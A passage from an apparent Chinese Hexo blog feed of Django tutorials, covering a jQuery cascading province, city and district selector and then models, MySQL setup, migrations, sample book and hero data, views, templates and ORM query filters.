<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;省市区列表&lt;/title&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot; src=&quot;/static/js/jquery-1.12.4.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        $(function()&#123;</span><br><span class="line">            //页面加载完成后获取省信息，并添加到省select</span><br><span class="line">            $.get(&#x27;/area2/&#x27;,function(dic) &#123;</span><br><span class="line">                pro=$(&#x27;#pro&#x27;)</span><br><span class="line">                $.each(dic.data,function(index,item)&#123;</span><br><span class="line">                    pro.append(&#x27;&lt;option value=&#x27;+item[0]+&#x27;&gt;&#x27;+item[1]+&#x27;&lt;/option&gt;&#x27;);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">            //为省select绑定change事件，获取市信息，并添加到市select</span><br><span class="line">            $(&#x27;#pro&#x27;).change(function()&#123;</span><br><span class="line">                $.get(&#x27;/area3_&#x27;+$(this).val()+&#x27;/&#x27;,function(dic)&#123;</span><br><span class="line">                    city=$(&#x27;#city&#x27;);</span><br><span class="line">                    city.empty().append(&#x27;&lt;option value=&quot;&quot;&gt;请选择市&lt;/option&gt;&#x27;);</span><br><span class="line">                    dis=$(&#x27;#dis&#x27;);</span><br><span class="line">                    dis.empty().append(&#x27;&lt;option value=&quot;&quot;&gt;请选择区县&lt;/option&gt;&#x27;);</span><br><span class="line">                    $.each(dic.data,function(index,item)&#123;</span><br><span class="line">                        city.append(&#x27;&lt;option value=&#x27;+item[0]+&#x27;&gt;&#x27;+item[1]+&#x27;&lt;/option&gt;&#x27;);</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">            //为市select绑定change事件，获取区县信息，并添加到区县select</span><br><span class="line">            $(&#x27;#city&#x27;).change(function()&#123;</span><br><span class="line">                $.get(&#x27;/area3_&#x27;+$(this).val()+&#x27;/&#x27;,function(dic)&#123;</span><br><span class="line">                    dis=$(&#x27;#dis&#x27;);</span><br><span class="line">                    dis.empty().append(&#x27;&lt;option value=&quot;&quot;&gt;请选择区县&lt;/option&gt;&#x27;);</span><br><span class="line">                    $.each(dic.data,function(index,item)&#123;</span><br><span class="line">                        dis.append(&#x27;&lt;option value=&#x27;+item[0]+&#x27;&gt;&#x27;+item[1]+&#x27;&lt;/option&gt;&#x27;);</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;select id=&quot;pro&quot;&gt;</span><br><span class="line">    &lt;option value=&quot;&quot;&gt;请选择省&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;select id=&quot;city&quot;&gt;</span><br><span class="line">    &lt;option value=&quot;&quot;&gt;请选择市&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;select id=&quot;dis&quot;&gt;</span><br><span class="line">    &lt;option value=&quot;&quot;&gt;请选择区县&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>5）运行服务器，在浏览器中输入如下网址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/area1/</span><br></pre></td></tr></table></figure>

<p>浏览效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-26-19-45-58.png" class="">

<p>6）打开 <code>booktest/views.py</code> 文件，定义视图 area2 ，用于获取省信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.http import JsonResponse</span><br><span class="line">...</span><br><span class="line">#获取省信息</span><br><span class="line">def area2(request):</span><br><span class="line">    list = AreaInfo.objects.filter(aParent__isnull=True)</span><br><span class="line">    list2 = []</span><br><span class="line">    for item in list:</span><br><span class="line">        list2.append([item.id, item.atitle])</span><br><span class="line">    return JsonResponse(&#123;&#x27;data&#x27;: list2&#125;)</span><br></pre></td></tr></table></figure>

<p>7）打开 <code>booktest/urls.py</code> 文件，配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^area2/$&#x27;, views.area2),</span><br></pre></td></tr></table></figure>

<p>8）在浏览器中输入如下网址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/area2/</span><br></pre></td></tr></table></figure>

<p>浏览效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-26-19-46-45.png" class="">

<p>9）打开 <code>booktest/views.py</code> 文件，定义视图 area3，用于根据编号获取对应的子级信息，如果传递的是省编号则获取市信息，如果传递的是市编号则获取区县信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#根据pid查询子级区域信息</span><br><span class="line">def area3(request, pid):</span><br><span class="line">    list = AreaInfo.objects.filter(aParent_id=pid)</span><br><span class="line">    list2 = []</span><br><span class="line">    for item in list:</span><br><span class="line">        list2.append([item.id, item.atitle])</span><br><span class="line">    return JsonResponse(&#123;&#x27;data&#x27;: list2&#125;)</span><br></pre></td></tr></table></figure>

<p>10）打开 <code>booktest/urls.py</code> 文件，配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^area3_(\d+)/$&#x27;, views.area3),</span><br></pre></td></tr></table></figure>

<p>11）在浏览器中输入如下网址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/area3_140000/</span><br></pre></td></tr></table></figure>

<p>浏览效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-26-19-47-22.png" class="">

<p>12）在浏览器中输入如下网址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/area1/</span><br></pre></td></tr></table></figure>

<p>选择效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-26-19-47-58.png" class="">
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Django学习-模型</title>
    <url>/2019/12/14/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h1><h2 id="创建项目-1"><a href="#创建项目-1" class="headerlink" title="创建项目"></a>创建项目</h2><p>进入虚拟环境中，创建项目 test2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">django-admin startproject test2</span><br></pre></td></tr></table></figure>

<img src="/2019/12/14/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B/2019-12-23-20-11-43.png" class="">

<h2 id="修改数据库"><a href="#修改数据库" class="headerlink" title="修改数据库"></a>修改数据库</h2><p>打开 <code>test2/settings.py</code> 文件，找到 DATABASES 项，默认使用 SQLite3 数据库。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    &#x27;default&#x27;: &#123;</span><br><span class="line">        &#x27;ENGINE&#x27;: &#x27;django.db.backends.sqlite3&#x27;,</span><br><span class="line">        &#x27;NAME&#x27;: os.path.join(BASE_DIR, &#x27;db.sqlite3&#x27;),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改为使用 MySQL 数据库，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    &#x27;default&#x27;: &#123;</span><br><span class="line">        # &#x27;ENGINE&#x27;: &#x27;django.db.backends.sqlite3&#x27;,</span><br><span class="line">        # &#x27;NAME&#x27;: os.path.join(BASE_DIR, &#x27;db.sqlite3&#x27;),</span><br><span class="line">        &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;, # 引擎</span><br><span class="line">        &#x27;NAME&#x27; : &#x27;test2&#x27;, # 数据库名称</span><br><span class="line">        &#x27;USER&#x27; : &#x27;ckcat&#x27;, # 数据库登录用户名</span><br><span class="line">        &#x27;PASSWORD&#x27; : &#x27;mysql&#x27;, # 数据库登录密码</span><br><span class="line">        &#x27;HOST&#x27; : &#x27;localhost&#x27;, #数据库所在主机</span><br><span class="line">        &#x27;PORT&#x27; : &#x27;3306&#x27;,  #数据库端口</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：test2 数据库配置 Django 框架不会自动生成，需要我们自己进入 mysql 数据库去创建。</p>
</blockquote>
<p>创建 test2 数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database test2 charset=utf8;</span><br></pre></td></tr></table></figure>

<h2 id="创建应用"><a href="#创建应用" class="headerlink" title="创建应用"></a>创建应用</h2><p>创建应用 booktest .</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py startapp booktest</span><br></pre></td></tr></table></figure>

<p>此时可能会出现一下错误。</p>
<img src="/2019/12/14/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B/2019-12-23-20-52-31.png" class="">

<p>此时需要安装 <code>pip install pymysql</code> ，安装成功后在 <code>test2/__init__.py</code> 文件中加上如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pymysql</span><br><span class="line">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure>

<p>然后再执行创建 booktest 应用的命令。</p>
<p>将应用 booktest 注册到项目中，打开 <code>/test2/settings.py</code> 文件，找到 INSTALLED_APPS 项，加入如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = (</span><br><span class="line">    &#x27;django.contrib.admin&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth&#x27;,</span><br><span class="line">    &#x27;django.contrib.contenttypes&#x27;,</span><br><span class="line">    &#x27;django.contrib.sessions&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages&#x27;,</span><br><span class="line">    &#x27;django.contrib.staticfiles&#x27;,</span><br><span class="line">    &#x27;booktest&#x27;, # 注册应用</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h1 id="定义模型类"><a href="#定义模型类" class="headerlink" title="定义模型类"></a>定义模型类</h1><h2 id="定义模型类-1"><a href="#定义模型类-1" class="headerlink" title="定义模型类"></a>定义模型类</h2><p>打开 booktest&#x2F;models.py 文件，定义模型类如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line"></span><br><span class="line"># Create your models here.</span><br><span class="line"></span><br><span class="line"># 定义图书模型类 BookInfo</span><br><span class="line">class BookInfo(models.Model):</span><br><span class="line">    btitle = models.CharField(max_length=20) # 图书名称</span><br><span class="line">    bpub_date = models.DateField() # 发布日期</span><br><span class="line">    bread = models.IntegerField(default=0) # 阅读量</span><br><span class="line">    bcomment = models.IntegerField(default=0) # 评论量</span><br><span class="line">    isDelete = models.BooleanField(default=False) # 逻辑删除</span><br><span class="line"></span><br><span class="line"># 定义英雄模型类 HeroInfo</span><br><span class="line">class HeroInfo(models.Model):</span><br><span class="line">    hname = models.CharField(max_length=20) #英雄名称</span><br><span class="line">    hgender = models.BooleanField(default=True) #英雄性别</span><br><span class="line">    isDelete = models.BooleanField(default=False) # 逻辑删除</span><br><span class="line">    hcomment = models.CharField(max_length=200) #英雄描叙信息</span><br><span class="line">    hbook = models.ForeignKey(&#x27;BookInfo&#x27;)# 英雄与图书为一对多关系</span><br></pre></td></tr></table></figure>

<h2 id="迁移"><a href="#迁移" class="headerlink" title="迁移"></a>迁移</h2><p>生成迁移文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>

<img src="/2019/12/14/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B/2019-12-23-21-16-26.png" class="">

<p>打开数据库命令行，查看当前所有表</p>
<img src="/2019/12/14/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B/2019-12-23-21-18-46.png" class="">

<p>表 bookinfo 结构如下</p>
<blockquote>
<p>默认值并不在数据库层面生效，而是在 django 创建对象时生效。</p>
</blockquote>
<img src="/2019/12/14/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B/2019-12-23-21-20-07.png" class="">

<p>表 heroinfo 结构如下：</p>
<blockquote>
<p>Django 框架会根据关系属性生成一个关系字段，并创建外键约束。</p>
</blockquote>
<img src="/2019/12/14/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B/2019-12-23-21-21-01.png" class="">

<h2 id="测试数据"><a href="#测试数据" class="headerlink" title="测试数据"></a>测试数据</h2><p>在数据库命令行中，复制如下语句执行，向 booktest_bookinfo 表中插入测试数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into booktest_bookinfo(btitle,bpub_date,bread,bcomment,isDelete) values</span><br><span class="line">(&#x27;射雕英雄传&#x27;,&#x27;1980-5-1&#x27;,12,34,0),</span><br><span class="line">(&#x27;天龙八部&#x27;,&#x27;1986-7-24&#x27;,36,40,0),</span><br><span class="line">(&#x27;笑傲江湖&#x27;,&#x27;1995-12-24&#x27;,20,80,0),</span><br><span class="line">(&#x27;雪山飞狐&#x27;,&#x27;1987-11-11&#x27;,58,24,0);</span><br></pre></td></tr></table></figure>

<p>再复制如下语句执行，向 booktest_heroinfo 表中插入测试数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into booktest_heroinfo(hname,hgender,hbook_id,hcomment,isDelete) values</span><br><span class="line">(&#x27;郭靖&#x27;,1,1,&#x27;降龙十八掌&#x27;,0),</span><br><span class="line">(&#x27;黄蓉&#x27;,0,1,&#x27;打狗棍法&#x27;,0),</span><br><span class="line">(&#x27;黄药师&#x27;,1,1,&#x27;弹指神通&#x27;,0),</span><br><span class="line">(&#x27;欧阳锋&#x27;,1,1,&#x27;蛤蟆功&#x27;,0),</span><br><span class="line">(&#x27;梅超风&#x27;,0,1,&#x27;九阴白骨爪&#x27;,0),</span><br><span class="line">(&#x27;乔峰&#x27;,1,2,&#x27;降龙十八掌&#x27;,0),</span><br><span class="line">(&#x27;段誉&#x27;,1,2,&#x27;六脉神剑&#x27;,0),</span><br><span class="line">(&#x27;虚竹&#x27;,1,2,&#x27;天山六阳掌&#x27;,0),</span><br><span class="line">(&#x27;王语嫣&#x27;,0,2,&#x27;神仙姐姐&#x27;,0),</span><br><span class="line">(&#x27;令狐冲&#x27;,1,3,&#x27;独孤九剑&#x27;,0),</span><br><span class="line">(&#x27;任盈盈&#x27;,0,3,&#x27;弹琴&#x27;,0),</span><br><span class="line">(&#x27;岳不群&#x27;,1,3,&#x27;华山剑法&#x27;,0),</span><br><span class="line">(&#x27;东方不败&#x27;,0,3,&#x27;葵花宝典&#x27;,0),</span><br><span class="line">(&#x27;胡斐&#x27;,1,4,&#x27;胡家刀法&#x27;,0),</span><br><span class="line">(&#x27;苗若兰&#x27;,0,4,&#x27;黄衣&#x27;,0),</span><br><span class="line">(&#x27;程灵素&#x27;,0,4,&#x27;医术&#x27;,0),</span><br><span class="line">(&#x27;袁紫衣&#x27;,0,4,&#x27;六合拳&#x27;,0);</span><br></pre></td></tr></table></figure>

<h2 id="定义视图"><a href="#定义视图" class="headerlink" title="定义视图"></a>定义视图</h2><p>打开 booktest&#x2F;views.py 文件，定义视图代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.shortcuts import render,redirect</span><br><span class="line">from booktest.models import *</span><br><span class="line">from datetime import date</span><br><span class="line"></span><br><span class="line">#查询所有图书并显示</span><br><span class="line">def index(request):</span><br><span class="line">    list=BookInfo.objects.all()</span><br><span class="line">    return render(request,&#x27;booktest/index.html&#x27;,&#123;&#x27;list&#x27;:list&#125;)</span><br><span class="line"></span><br><span class="line">#创建新图书</span><br><span class="line">def create(request):</span><br><span class="line">    book=BookInfo()</span><br><span class="line">    book.btitle = &#x27;流星蝴蝶剑&#x27;</span><br><span class="line">    book.bpub_date = date(1995,12,30)</span><br><span class="line">    book.save()</span><br><span class="line">    #转向到首页</span><br><span class="line">    return redirect(&#x27;/&#x27;)</span><br><span class="line"></span><br><span class="line">#逻辑删除指定编号的图书</span><br><span class="line">def delete(request,id):</span><br><span class="line">    book=BookInfo.objects.get(id=int(id))</span><br><span class="line">    book.delete()</span><br><span class="line">    #转向到首页</span><br><span class="line">    return redirect(&#x27;/&#x27;)</span><br></pre></td></tr></table></figure>

<h2 id="配置-url"><a href="#配置-url" class="headerlink" title="配置 url"></a>配置 url</h2><p>打开 test2&#x2F;urls.py 文件，配置 url 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.conf.urls import include, url</span><br><span class="line">from django.contrib import admin</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&#x27;^admin/&#x27;, include(admin.site.urls)),</span><br><span class="line">    #引入booktest的url配置</span><br><span class="line">    url(r&#x27;^&#x27;,include(&#x27;booktest.urls&#x27;)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>在 booktest 应用下创建 urls.py 文件，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.conf.urls import url</span><br><span class="line">from booktest import views</span><br><span class="line"></span><br><span class="line">urlpatterns=[</span><br><span class="line">    url(r&#x27;^$&#x27;,views.index),</span><br><span class="line">    url(r&#x27;^delete(\d+)/$&#x27;,views.delete),</span><br><span class="line">    url(r&#x27;^create/$&#x27;,views.create),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="创建模板"><a href="#创建模板" class="headerlink" title="创建模板"></a>创建模板</h2><p>打开 test2&#x2F;settings.py&#96; 文件，配置模板查找目录 TEMPLATES 的 DIRS 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TEMPLATES = [</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;BACKEND&#x27;: &#x27;django.template.backends.django.DjangoTemplates&#x27;,</span><br><span class="line">        &#x27;DIRS&#x27;: [os.path.join(BASE_DIR, &quot;templates&quot;)],#配置模板查找目录</span><br><span class="line">        &#x27;APP_DIRS&#x27;: True,</span><br><span class="line">        &#x27;OPTIONS&#x27;: &#123;</span><br><span class="line">            &#x27;context_processors&#x27;: [</span><br><span class="line">                &#x27;django.template.context_processors.debug&#x27;,</span><br><span class="line">                &#x27;django.template.context_processors.request&#x27;,</span><br><span class="line">                &#x27;django.contrib.auth.context_processors.auth&#x27;,</span><br><span class="line">                &#x27;django.contrib.messages.context_processors.messages&#x27;,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>创建 <code>templates/booktest/index.html</code> 文件, 模板代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;/create/&quot;&gt;创建&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;% for book in list %&#125;</span><br><span class="line">        &lt;li&gt;&#123;&#123; book.btitle &#125;&#125; -- &lt;a href=&quot;/delete&#123;&#123; book.id &#125;&#125;/&quot;&gt;删除&lt;/a&gt; &lt;/li&gt;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>运行服务器，在浏览器中查看。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py runserver</span><br></pre></td></tr></table></figure>

<h1 id="定义属性"><a href="#定义属性" class="headerlink" title="定义属性"></a>定义属性</h1><p>django 会为表创建自动增长的主键列，每个模型只能有一个主键列，如果使用选项设置某属性为主键列后 django 不会再创建自动增长的主键列。</p>
<p>属性命名限制：</p>
<ul>
<li>不能是 python 的保留关键字。</li>
<li>不允许使用连续的下划线，这是由 django 的查询方式决定的，在后面会详细讲解查询。</li>
<li>定义属性时需要指定字段类型，通过字段类型的参数指定选项，语法如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">属性 = models.字段类型(选项)</span><br></pre></td></tr></table></figure>

<h2 id="字段类型"><a href="#字段类型" class="headerlink" title="字段类型"></a>字段类型</h2><p>使用时需要引入 django.db.models 包，字段类型如下：</p>
<ul>
<li><code>AutoField</code>：自动增长的 IntegerField ，通常不用指定，不指定时 Django 会自动创建属性名为 id 的自动增长属性。</li>
<li><code>BooleanField</code>：布尔字段，值为 True 或 False 。</li>
<li><code>NullBooleanField</code>：支持 Null 、 True 、 False 三种值。</li>
<li><code>CharField(max_length=字符长度)</code>：字符串。<ul>
<li>参数 max_length 表示最大字符个数。</li>
</ul>
</li>
<li><code>TextField</code> ：大文本字段，一般超过 4000 个字符时使用。</li>
<li><code>IntegerField</code> ：整数。</li>
<li><code>DecimalField(max_digits=None, decimal_places=None)</code> ：十进制浮点数。<ul>
<li>参数 max_digits 表示总位数。</li>
<li>参数 decimal_places 表示小数位数。</li>
</ul>
</li>
<li><code>FloatField</code> ：浮点数。</li>
<li><code>DateField[auto_now=False, auto_now_add=False])</code> ：日期。<ul>
<li>参数 auto_now 表示每次保存对象时，自动设置该字段为当前时间，用于”最后一次修改”的时间戳，它总是使用当前日期，默认为 false 。</li>
<li>参数 auto_now_add 表示当对象第一次被创建时自动设置当前时间，用于创建的时间戳，它总是使用当前日期，默认为 false 。</li>
<li>参数 auto_now_add 和 auto_now 是相互排斥的，组合将会发生错误。</li>
</ul>
</li>
<li><code>TimeField</code>：时间，参数同 DateField 。</li>
<li><code>DateTimeField</code>：日期时间，参数同 DateField 。</li>
<li><code>FileField</code>：上传文件字段。</li>
<li><code>ImageField</code>：继承于 FileField ，对上传的内容进行校验，确保是有效的图片。</li>
</ul>
<h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><p>通过选项实现对字段的约束，选项如下：</p>
<ul>
<li><code>null</code> ：如果为 True ，表示允许为空，默认值是 False 。</li>
<li><code>blank</code>：如果为 True ，则该字段允许为空白，默认值是 False 。<ul>
<li><strong>对比：null 是数据库范畴的概念，blank 是表单验证范畴的。</strong></li>
</ul>
</li>
<li><code>db_column</code> ：字段的名称，如果未指定，则使用属性的名称。</li>
<li><code>db_index</code> ：若值为 True , 则在表中会为此字段创建索引，默认值是 False 。</li>
<li><code>default</code> ：默认值。</li>
<li><code>primary_key</code> ：若为 True ，则该字段会成为模型的主键字段，默认值是 False ，一般作为 AutoField 的选项使用。</li>
<li><code>unique</code>：如果为 True , 这个字段在表中必须有唯一值，默认值是 False 。</li>
</ul>
<h2 id="综合演示"><a href="#综合演示" class="headerlink" title="综合演示"></a>综合演示</h2><p>修改 <code>booktest/models.py</code> 中模型类，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 定义图书模型类 BookInfo</span><br><span class="line">class BookInfo(models.Model):</span><br><span class="line">    # btitle = models.CharField(max_length=20) # 图书名称</span><br><span class="line">    btitle = models.CharField(max_length=20, db_column=&#x27;title&#x27;) # 通过db_column指定btitle对应表格中字段的名字为title</span><br><span class="line">    bpub_date = models.DateField() # 发布日期</span><br><span class="line">    bread = models.IntegerField(default=0) # 阅读量</span><br><span class="line">    bcomment = models.IntegerField(default=0) # 评论量</span><br><span class="line">    isDelete = models.BooleanField(default=False) # 逻辑删除</span><br><span class="line"></span><br><span class="line"># 定义英雄模型类 HeroInfo</span><br><span class="line">class HeroInfo(models.Model):</span><br><span class="line">    hname = models.CharField(max_length=20) #英雄名称</span><br><span class="line">    hgender = models.BooleanField(default=True) #英雄性别</span><br><span class="line">    isDelete = models.BooleanField(default=False) # 逻辑删除</span><br><span class="line">    # hcomment = models.CharField(max_length=200) #英雄描叙信息</span><br><span class="line">    # hcomment对应的数据库中的字段可以为空，但通过后台管理页面添加英雄信息时hcomment对应的输入框不能为空</span><br><span class="line">    hcomment = models.CharField(max_length=200, null=True, blank=False)</span><br><span class="line">    hbook = models.ForeignKey(&#x27;BookInfo&#x27;)# 英雄与图书为一对多关系</span><br></pre></td></tr></table></figure>

<p>然后生成迁移文件并执行迁移命令，最后查看 test2 数据库中的内容。</p>
<h2 id="字段查询"><a href="#字段查询" class="headerlink" title="字段查询"></a>字段查询</h2><p>实现 sql 中 where 的功能，调用过滤器 filter() 、 exclude() 、 get() ，下面以 filter() 为例。</p>
<p>语法如下：</p>
<blockquote>
<p>说明：属性名称和比较运算符间使用两个下划线，所以属性名不能包括多个下划线。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">属性名称__比较运算符=值</span><br></pre></td></tr></table></figure>

<h2 id="条件运算符"><a href="#条件运算符" class="headerlink" title="条件运算符"></a>条件运算符</h2><h3 id="exact：表示判等"><a href="#exact：表示判等" class="headerlink" title="exact：表示判等"></a>exact：表示判等</h3><p>例: 查询没有被删除的图书</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查询没有被逻辑删除的图书,下列两种方式都可以</span><br><span class="line">#bklist = BookInfo.objects.filter(isDelete__exact= 0)</span><br><span class="line">bklist = BookInfo.objects.filter(isDelete = 0)</span><br></pre></td></tr></table></figure>

<h3 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h3><p><strong>contains：是否包含。</strong></p>
<blockquote>
<p>说明：如果要包含%无需转义，直接写即可。</p>
</blockquote>
<p>例：查询书名包含’传’的图书。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bklist = BookInfo.objects.filter(btitle__contains = &quot;传&quot;)</span><br></pre></td></tr></table></figure>

<p><strong>startswith、endswith：以指定值开头或结尾。</strong></p>
<p>例：查询书名以’部’结尾的图书</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bklist = BookInfo.objects.filter(btitle__endswith =  &quot;部&quot;)</span><br></pre></td></tr></table></figure>

<p><strong>空查询 isnull : 是否为 null 。</strong></p>
<p>例：查询书名不为空的图书。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bklist = BookInfo.objects.filter(btitle__isnull=False)</span><br></pre></td></tr></table></figure>

<p><strong>范围查询 in ：是否包含在范围内。</strong></p>
<p>例：查询编号为 1 或 3 或 5 的图书</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bklist = BookInfo.objects.filter(id__in=[1, 3, 5])</span><br></pre></td></tr></table></figure>

<p><strong>比较查询</strong></p>
<blockquote>
<p>gt、gte、lt、lte：大于、大于等于、小于、小于等于。</p>
</blockquote>
<p>例：查询编号大于 3 的图书</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bklist = BookInfo.objects.filter(id__gt = 3)</span><br></pre></td></tr></table></figure>

<p><strong>不等于的运算符，使用 <code>exclude()</code> 过滤器。</strong></p>
<p>例：查询编号不等于 3 的图书</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bklist = BookInfo.objects.exclude(id=3)</span><br></pre></td></tr></table></figure>

<p><strong>日期查询</strong></p>
<blockquote>
<p>year、month、day、week_day、hour、minute、second：对日期时间类型的属性进行运算。</p>
</blockquote>
<p>例：查询 1980 年发表的图书。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bklist = BookInfo.objects.filter(bpub_date__year=1980)</span><br></pre></td></tr></table></figure>

<p>例：查询 1980 年 1 月 1 日后发表的图书。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bklist = BookInfo.objects.filter(bpub_date__gt=date(1990, 1, 1))</span><br></pre></td></tr></table></figure>

<h2 id="F-对象"><a href="#F-对象" class="headerlink" title="F 对象"></a>F 对象</h2><p>之前的查询都是对象的属性与常量值比较，两个属性怎么比较呢？ 答：使用 F 对象，被定义在 django.db.models 中。</p>
<p>语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F(属性名)</span><br></pre></td></tr></table></figure>

<p>例：查询阅读量大于等于评论量的图书。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db.models import F</span><br><span class="line">...</span><br><span class="line">bklist = BookInfo.objects.filter(bread__gte=F(&#x27;bcomment&#x27;))</span><br></pre></td></tr></table></figure>

<p>可以在 F 对象上使用算数运算。</p>
<p>例：查询阅读量大于 2 倍评论量的图书。</p>
